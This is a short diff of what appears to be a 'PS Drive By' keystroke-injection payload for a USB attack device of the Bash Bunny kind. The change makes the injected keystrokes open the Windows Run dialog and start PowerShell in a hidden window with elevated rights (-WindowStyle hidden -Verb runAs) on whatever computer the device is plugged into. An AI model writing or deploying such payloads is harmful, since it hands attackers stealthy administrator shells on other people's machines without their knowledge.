@@ -1,4 +1,5 @@
-#PS Drive By
+####PS Drive By####
+
 #!/bin/bash
 ##############################################
 # Sharing Internet with Windows
@@ -49,8 +50,7 @@ LED STAGE2
 DELAY 500
 Q GUI r
 Q DELAY 1000
-Q STRING powershell Start-Process powershell
-# Q STRING powershell Start-Process powershell -WindowStyle hidden -Verb runAs
+Q STRING powershell Start-Process powershell -WindowStyle hidden -Verb runAs
 Q DELAY 1000
 Q ENTER
 Q DELAY 1000
